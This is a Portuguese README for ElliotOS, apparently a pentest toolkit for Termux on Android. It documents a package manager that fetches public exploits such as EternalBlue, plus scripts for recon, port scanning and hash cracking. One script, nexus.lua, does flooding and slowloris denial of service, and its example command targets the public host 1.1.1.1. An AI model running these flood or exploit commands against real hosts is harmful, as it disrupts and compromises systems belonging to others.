
## LPM — Gerenciador de Pacotes Lua

O `lpm` instala módulos Lua do LuaRocks e busca/baixa scripts de exploit de fontes públicas.

```bash
# Instalar módulo do LuaRocks (fallback automático: lux/GitHub)
lpm install luasocket

# Forçar instalação por fonte específica
lpm install --from lux luasocket
lpm install --from luarocks luasocket

# Remover módulo
lpm remove luasocket

# Listar módulos instalados
lpm list

# Buscar exploits (cache 24h)
lpm --script -s eternalblue
lpm --script -s eternalblue --source packetstorm
lpm --script -s webapps --type dos
lpm --script -s linux --platform linux
lpm --script -l                        # lista fontes disponíveis
lpm --script -i 3                      # baixa o item 3 do último resultado

# Instalar exploit por nome
lpm install --from exploit eternalblue
```

**Fontes disponíveis:** `exploit-db` (padrão), `packetstorm`, `github`

**Scripts baixados ficam em:** `~/.elliot/scripts/`

---

## Scripts de exemplo

O ElliotOS instala scripts prontos em `$PREFIX/share/lua-scripts/`. Liste com `ms --examples`.

| Script | Descrição |
|--------|-----------|
| `learn.lua` | Tutorial interativo completo — 30 lições em 4 trilhas: Lua do zero ao avançado, ElliotOS API, C e projetos reais de pentest. Menu com navegação por trilha ou lição específica |
| `recon.lua` | Recon completo de um alvo: ping, DNS, port scan com threads, banner grab, headers HTTP e OS fingerprint |
| `portscan.lua` | Port scanner rápido com threads e banner grab, identifica FTP/SSH/HTTP/MySQL/Redis... |
| `webcheck.lua` | Auditoria de headers HTTP: HSTS, CSP, X-Frame-Options, Referrer-Policy — gera score de segurança em % |
| `hashcrack.lua` | Cracker MD5/SHA256 via wordlist — detecta tipo de hash automaticamente pelo tamanho |
| `nexus.lua` | Framework de rede avançado: flood (UDP/TCP/HTTP/ICMP/PSYN), slowloris, recon, DNS, ping, hosts |

```bash
# Tutorial interativo — 30 lições, menu por trilha
ms --learn

# Documentação por módulo
ms --doc
ms --doc net
ms --doc mod
ms --doc crypto

# Listar scripts com descrição e categoria
ms --examples

# Tutorial interativo (alternativa via --script)
ms --script learn

# Recon completo de um alvo
ms --script recon -- alvo.com

# Port scan
ms --script portscan -- 192.168.1.1
ms --script portscan -- 192.168.1.1 1 9999 32   # range + 32 threads

# Auditoria de headers
ms --script webcheck -- https://alvo.com

# Crack de hash
ms --script hashcrack -- d8578edf8458ce06fbc5bb76a58c5ca4 wordlist.txt

# Nexus — recon + flood
ms --script nexus -- --recon 192.168.1.1 -p 22,80,443
ms --script nexus -- --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512
ms --script nexus -- --slow 192.168.1.1 -p 80 -s 200 -st 10
ms --script nexus -- --dns google.com youtube.com github.com
ms --script nexus -- --hosts
```

---

## Documentação e aprendizado

O ElliotOS tem três formas de aprender e consultar a API, todas em português, sem precisar sair do terminal.

### `ms --learn` — Tutorial completo (30 lições)

O tutorial é interativo e dividido em 4 trilhas. Ao iniciar, um menu permite escolher de onde começar:

| Trilha | Conteúdo | Lições |
|--------|----------|--------|
| **1 — Lua do zero ao avançado** | Variáveis, tipos, operadores, if/else, loops, funções, tables, strings, módulos, OOP com metatables, erros/pcall, corrotinas | 1–12 |
| **2 — Lua + ElliotOS API** | net.*, mod.*, crypto.*, sys.*, fs.*, ai.*, db.*, scripts profissionais, lpm/xpm | 13–21 |
| **3 — C no ElliotOS** | Base de C vs Lua, tipos, ponteiros, memória, sockets raw, criar módulo `.so` para o ms | 22–27 |
| **4 — Projetos reais** | Scanner de vulnerabilidades completo, port scanner multi-thread, próximos passos | 28–30 |

Navegação: **ENTER** avança, **s** pula a lição, **q** sai. É possível ir direto para qualquer lição pelo número.

```bash
ms --learn
```

### `ms --doc` — Referência da API

Documentação técnica de cada módulo, consultável por nome:

```bash
ms --doc               # visão geral do sistema
ms --doc modulos       # todos os módulos listados
ms --doc net           # net.* — HTTP, TCP, UDP, DNS, sockets, port scan
ms --doc mod           # mod.* — 23 scanners (XSS, SQLi, LFI, RCE, SSRF...)
ms --doc crypto        # crypto.* — MD5, SHA, AES, Base64, JWT, HMAC
ms --doc sys           # sys.* — threads, processos, env, sleep, tempo
ms --doc fs            # fs.* — read, write, list, stat, glob, mkdir
ms --doc ai            # ai.* — CYN: chat, code, search, providers
```

### `ms --examples` — Scripts instalados

Lista todos os scripts em `$PREFIX/share/lua-scripts/` e `$PREFIX/share/c-scripts/` com nome, categoria e descrição extraídos do cabeçalho de cada arquivo.

```bash
ms --examples
```

---

## Interface Gráfica (opcional)

O ElliotOS suporta ambiente gráfico XFCE4 via Termux:X11:

```bash
# Requisito: instale o app Termux:X11 pelo F-Droid ou GitHub Releases

elliot-gui               # inicia servidor X11 + XFCE4
elliot-gui -b            # inicia em background (libera o terminal)
elliot-gui -m            # modo mobile: ícones grandes, touch-friendly
elliot-gui --kill        # encerra toda a sessão gráfica
```

### rungui — executa qualquer script com X11 automático

```bash
rungui -l <lang> [-t <lib>] <arquivo>
```

| Linguagem | Bibliotecas disponíveis |
|-----------|-------------------------|
| `python` | tkinter, pygame, wx, PyQt5, PyQt6, kivy, arcade, pyglet, turtle, glfw |
| `c` / `c++` | gtk, gtk3, gtk4, sdl2, sfml, opengl, fltk, wx |
| `java` | swing, javafx, awt |
| `love` | Love2D (diretório do projeto) |
| `lua` | — |

```bash
rungui -l python -t tkinter app.py
rungui -l c -t gtk janela.c
rungui -l love jogo/
```

O `rungui` fecha o servidor X11 automaticamente ao encerrar o script, se foi ele que o iniciou.

---

## Configurando a CYN (IA)

```bash
# Abre o chat com a CYN
ms -a

# Na primeira execução, ela pede a chave de API.
# O provider padrão é 'sky' (gratuito, sem chave).
```

Para obter uma chave gratuita do Gemini: [aistudio.google.com](https://aistudio.google.com)

---

## Estrutura do projeto

```
ElliotOS/
├── luascript.sh          # Script único de instalação (v17.0)
│   ├── libnet.c          # Biblioteca C com 23 módulos de segurança
│   ├── Lua 5.4.8 source  # Interpretador customizado (baixado de lua.org)
│   ├── lua-net binary    # Embutido como heredoc compilado na instalação
│   ├── xpm               # Gerenciador de pentest (Bash)
│   │   └── appforge       # Conversor HTML/CSS/JS → APK (instalável via xpm)
│   ├── lpm               # Gerenciador de pacotes Lua (Bash)
│   ├── cxx               # Compilador wrapper (Bash)
│   ├── ee                # Editor nativo (C, embutido)
│   ├── xtun              # Tunnel Toolkit (C, embutido)
│   └── scripts/          # learn.lua, recon.lua, portscan.lua, webcheck.lua,
│                         # hashcrack.lua, nexus.lua e outros
└── README.md
```

### Diretórios criados na instalação

| Caminho | Conteúdo |
|---------|----------|
| `$HOME/.lua-net-build` | Diretório de compilação |
| `$HOME/.lua-cache` | Cache de downloads (fontes do Lua) |
| `$HOME/.lua-modules` | Módulos do usuário (lmod) |
| `$HOME/.elliotai` | Configuração e cache da CYN |
| `$HOME/.elliot` | Dados do usuário, scripts baixados via lpm |
| `$PREFIX/share/lua-scripts` | Scripts de exemplo do ElliotOS |
| `$PREFIX/share/c-scripts` | Scripts C prontos |
| `$PREFIX/share/lua-modules` | Módulos Lua do sistema |

---

## Requisitos de hardware

| Item | Mínimo |
|------|--------|
| Android | 7.0+ (SDK 21) |
| Android recomendado | 9.0+ (SDK 28) |
| Termux | 0.118+ (F-Droid) |
| RAM | 2 GB |
| Armazenamento livre | 2 GB (com ferramentas XPM, mais) |
| Root | **Não necessário** |
| Conexão | Necessária apenas na instalação |

---

## Autor

**Mike Elliot** — desenvolvedor independente, criador do ElliotOS.

- YouTube: [@Mikeelliotmkll12](https://youtube.com/@Mikeelliotmkll12)
- GitHub: [github.com/mikeelliot218](https://github.com/mikeelliot218)

---

## Licença

MIT — livre para usar, estudar, modificar e distribuir. Gratuito para sempre.

---

<div align="center">

*"Black Arch, Kali, Parrot — todos no PC. O ElliotOS fica no bolso."*

**⭐ Se o projeto te ajudou, deixa uma estrela no repositório.**

</div>
